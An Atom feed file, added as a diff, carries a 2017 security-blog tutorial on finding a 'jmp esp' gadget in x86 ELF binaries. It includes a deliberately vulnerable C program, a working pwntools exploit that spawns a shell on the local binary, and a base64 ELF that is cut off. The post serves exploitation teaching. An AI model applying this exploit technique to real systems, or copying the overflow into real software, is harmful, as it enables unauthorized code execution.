@@ -1,0 +1,168 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Tech Rain - Pwn</title><link href="https://blog.inndy.tw/" rel="alternate"></link><link href="https://blog.inndy.tw/feeds/pwn.atom.xml" rel="self"></link><id>https://blog.inndy.tw/</id><updated>2017-01-24T12:27:00+08:00</updated><entry><title>x86 ELF Stack Overflow Jmp Esp (Rip) Trick</title><link href="https://blog.inndy.tw/2017/01/24/x86-ELF-stack-overflow-jmp-esp-trick/" rel="alternate"></link><published>2017-01-24T12:27:00+08:00</published><updated>2017-01-24T12:27:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2017-01-24:/2017/01/24/x86-ELF-stack-overflow-jmp-esp-trick/</id><summary type="html">&lt;p&gt;In short: You can find &lt;code&gt;jmp esp&lt;/code&gt; (&lt;code&gt;jmp rip&lt;/code&gt;) gadget in almost every dynamic linked ELF binary.&lt;/p&gt;
+&lt;p&gt;Here's a common &lt;code&gt;\_start&lt;/code&gt; from a x86 ELF binary:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;080488&lt;/span&gt;&lt;span class="nf"&gt;d3&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;_start&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d3:&lt;/span&gt;       &lt;span class="err"&gt;31&lt;/span&gt; &lt;span class="nf"&gt;ed&lt;/span&gt;                   &lt;span class="no"&gt;xor&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d5:&lt;/span&gt;       &lt;span class="err"&gt;5&lt;/span&gt;&lt;span class="nf"&gt;e&lt;/span&gt;                      &lt;span class="no"&gt;pop&lt;/span&gt;    &lt;span class="no"&gt;esi&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d6:&lt;/span&gt;       &lt;span class="err"&gt;89&lt;/span&gt; &lt;span class="nf"&gt;e1&lt;/span&gt;                   &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;
+ &lt;span class="err"&gt;80488 …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;In short: You can find &lt;code&gt;jmp esp&lt;/code&gt; (&lt;code&gt;jmp rip&lt;/code&gt;) gadget in almost every dynamic linked ELF binary.&lt;/p&gt;
+&lt;p&gt;Here's a common &lt;code&gt;\_start&lt;/code&gt; from a x86 ELF binary:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;080488&lt;/span&gt;&lt;span class="nf"&gt;d3&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;_start&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d3:&lt;/span&gt;       &lt;span class="err"&gt;31&lt;/span&gt; &lt;span class="nf"&gt;ed&lt;/span&gt;                   &lt;span class="no"&gt;xor&lt;/span&gt;    &lt;span class="no"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ebp&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d5:&lt;/span&gt;       &lt;span class="err"&gt;5&lt;/span&gt;&lt;span class="nf"&gt;e&lt;/span&gt;                      &lt;span class="no"&gt;pop&lt;/span&gt;    &lt;span class="no"&gt;esi&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d6:&lt;/span&gt;       &lt;span class="err"&gt;89&lt;/span&gt; &lt;span class="nf"&gt;e1&lt;/span&gt;                   &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;d8:&lt;/span&gt;       &lt;span class="err"&gt;83&lt;/span&gt; &lt;span class="nf"&gt;e4&lt;/span&gt; &lt;span class="no"&gt;f0&lt;/span&gt;                &lt;span class="no"&gt;and&lt;/span&gt;    &lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0xfffffff0&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;db:&lt;/span&gt;       &lt;span class="err"&gt;50&lt;/span&gt;                      &lt;span class="nf"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;dc:&lt;/span&gt;       &lt;span class="err"&gt;54&lt;/span&gt;                      &lt;span class="nf"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;esp&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;dd:&lt;/span&gt;       &lt;span class="err"&gt;52&lt;/span&gt;                      &lt;span class="nf"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;edx&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;de:&lt;/span&gt;       &lt;span class="err"&gt;68&lt;/span&gt; &lt;span class="err"&gt;80&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt;          &lt;span class="no"&gt;push&lt;/span&gt;   &lt;span class="mi"&gt;0x8048f80&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;e3:&lt;/span&gt;       &lt;span class="err"&gt;68&lt;/span&gt; &lt;span class="err"&gt;10&lt;/span&gt; &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;f&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt;          &lt;span class="no"&gt;push&lt;/span&gt;   &lt;span class="mi"&gt;0x8048f10&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;e8:&lt;/span&gt;       &lt;span class="err"&gt;51&lt;/span&gt;                      &lt;span class="nf"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;ecx&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;e9:&lt;/span&gt;       &lt;span class="err"&gt;56&lt;/span&gt;                      &lt;span class="nf"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;esi&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;ea:&lt;/span&gt;       &lt;span class="err"&gt;68&lt;/span&gt; &lt;span class="nf"&gt;b0&lt;/span&gt; &lt;span class="mi"&gt;88&lt;/span&gt; &lt;span class="mi"&gt;04&lt;/span&gt; &lt;span class="mi"&gt;08&lt;/span&gt;          &lt;span class="no"&gt;push&lt;/span&gt;   &lt;span class="mi"&gt;0x80488b0&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;ef:&lt;/span&gt;       &lt;span class="nf"&gt;e8&lt;/span&gt; &lt;span class="no"&gt;cc&lt;/span&gt; &lt;span class="no"&gt;fe&lt;/span&gt; &lt;span class="no"&gt;ff&lt;/span&gt; &lt;span class="no"&gt;ff&lt;/span&gt;          &lt;span class="no"&gt;call&lt;/span&gt;   &lt;span class="mh"&gt;80487c0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;__libc_start_main@plt&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f4:&lt;/span&gt;       &lt;span class="nf"&gt;f4&lt;/span&gt;                      &lt;span class="no"&gt;hlt&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f5:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f7:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f9:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;fb:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;fd:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;ff:&lt;/span&gt;       &lt;span class="err"&gt;90&lt;/span&gt;                      &lt;span class="nf"&gt;nop&lt;/span&gt;
+
+&lt;span class="err"&gt;08048900&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;__x86.get_pc_thunk.bx&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+ &lt;span class="err"&gt;8048900:&lt;/span&gt;       &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="no"&gt;c&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;                &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;DWORD&lt;/span&gt; &lt;span class="no"&gt;PTR&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+ &lt;span class="err"&gt;8048903:&lt;/span&gt;       &lt;span class="nf"&gt;c3&lt;/span&gt;                      &lt;span class="no"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Use instruction truncation trick, diassembly at &lt;code&gt;0x080488f3&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f3:&lt;/span&gt;       &lt;span class="nf"&gt;ff&lt;/span&gt; &lt;span class="no"&gt;f4&lt;/span&gt;                   &lt;span class="no"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;esp&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f5:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f7:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f9:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;fb:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;fd:&lt;/span&gt;       &lt;span class="err"&gt;66&lt;/span&gt; &lt;span class="err"&gt;90&lt;/span&gt;                   &lt;span class="nf"&gt;xchg&lt;/span&gt;   &lt;span class="no"&gt;ax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;ax&lt;/span&gt;
+ &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;ff:&lt;/span&gt;       &lt;span class="err"&gt;90&lt;/span&gt;                      &lt;span class="nf"&gt;nop&lt;/span&gt;
+ &lt;span class="err"&gt;8048900:&lt;/span&gt;       &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="no"&gt;c&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;                &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;DWORD&lt;/span&gt; &lt;span class="no"&gt;PTR&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+ &lt;span class="err"&gt;8048903:&lt;/span&gt;       &lt;span class="nf"&gt;c3&lt;/span&gt;                      &lt;span class="no"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Which equals to:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; &lt;span class="err"&gt;80488&lt;/span&gt;&lt;span class="nl"&gt;f3:&lt;/span&gt;       &lt;span class="nf"&gt;ff&lt;/span&gt; &lt;span class="no"&gt;f4&lt;/span&gt;                   &lt;span class="no"&gt;push&lt;/span&gt;   &lt;span class="no"&gt;esp&lt;/span&gt;
+ &lt;span class="err"&gt;8048900:&lt;/span&gt;       &lt;span class="err"&gt;8&lt;/span&gt;&lt;span class="nf"&gt;b&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="no"&gt;c&lt;/span&gt; &lt;span class="mi"&gt;24&lt;/span&gt;                &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;DWORD&lt;/span&gt; &lt;span class="no"&gt;PTR&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+ &lt;span class="err"&gt;8048903:&lt;/span&gt;       &lt;span class="nf"&gt;c3&lt;/span&gt;                      &lt;span class="no"&gt;ret&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We know that: &lt;code&gt;jmp $ADDR&lt;/code&gt; equals to &lt;code&gt;push $ADDR; ret&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;So, once you got a binary without NX (DEP), this gadget would be super useful!&lt;/p&gt;
+&lt;h2&gt;Sample&lt;/h2&gt;
+&lt;p&gt;easybof.c:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// gcc-4.8 easybof.c -o easybof -m32 -zexecstack -fno-stack-protector -D_FORTIFY_SOURCE=0 -O3&lt;/span&gt;
+&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+
+    &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Overflow me plz:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;exploit.py:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="c1"&gt;# pip2 install pwntools&lt;/span&gt;
+
+&lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sig&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;next&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sig&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="n"&gt;elf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;easybof&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xc3&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;jmp_esp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\xff\xff\xf4&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;RET     gadget at 0x&lt;/span&gt;&lt;span class="si"&gt;%.8x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;JMP_ESP gadget at 0x&lt;/span&gt;&lt;span class="si"&gt;%.8x&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;jmp_esp&lt;/span&gt;
+
+&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;io&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./easybof&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;shellcode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;asm&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcraft&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
+&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;jmp_esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;
+
+&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;easybof.elf (base64 encoded):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAg4MECDQAAABAEQAAAAAAADQAIAAJACgAHQAcAAYAAAA0AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQB
+AABUgQQIVIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIAAYAAAAGAAAFAAAAABAAAAEAAAAIDwAACJ8ECAifBAgYAQAAHAEAAAYAAAAAEAAA
+AgAAABQPAAAUnwQIFJ8ECOgAAADoAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQIRAAAAEQAAAAEAAAABAAAAFDldGQUBQAAFIUECBSFBAgsAAAALAAAAAQA
+AAAEAAAAUeV0ZAAAAAAAAAAAAAAAAAAAAAAAAAAABwAAABAAAABS5XRkCA8AAAifBAgInwQI+AAAAPgAAAAEAAAAAQAAAC9saWIvbGQtbGludXguc28uMgAA
+BAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAACAAAAAEAAAAFAAAAAMAAABHTlUAmF4v/yvg/OqNvHV1Kph85MWyx6MCAAAABQAAAAEAAAAFAAAAACAAIAAA
+AAAFAAAArUvjwAAAAAAAAAAAAAAAAAAAAAAaAAAAAAAAAAAAAAASAAAANwAAAAAAAAAAAAAAIAAAAB8AAAAAAAAAAAAAABIAAAAxAAAAAAAAAAAAAAASAAAA
+CwAAAPyEBAgEAAAAEQAQAABsaWJjLnNvLjYAX0lPX3N0ZGluX3VzZWQAcmVhZABfX2xpYmNfc3RhcnRfbWFpbgB3cml0ZQBfX2dtb25fc3RhcnRfXwBHTElC
+Q18yLjAAAAACAAAAAgACAAEAAQABAAEAAAAQAAAAAAAAABBpaQ0AAAIARgAAAAAAAAD8nwQIBgIAAAygBAgHAQAAEKAECAcDAAAUoAQIBwQAAFOD7Ajo3wAA
+AIHDLx0AAIuD/P///4XAdAXoSgAAAIPECFvDAAAAAAD/NQSgBAj/JQigBAgAAAAA/yUMoAQIaAAAAADp4P////8lEKAECGgIAAAA6dD/////JRSgBAhoEAAA
+AOnA/////yX8nwQIZpAAAAAAAAAAAFWJ5YPk8IPsIMdEJAgQAAAAx0QkBACFBAjHBCQBAAAA6Lv///+NRCQYx0QkCIAAAACJRCQExwQkAAAAAOh/////ycMx
+7V6J4YPk8FBUUmjghAQIaICEBAhRVmhAgwQI6Gz////0ZpBmkGaQZpBmkJCLHCTDZpBmkGaQZpBmkGaQuCOgBAgtIKAECIP4BncBw7gAAAAAhcB09lWJ5YPs
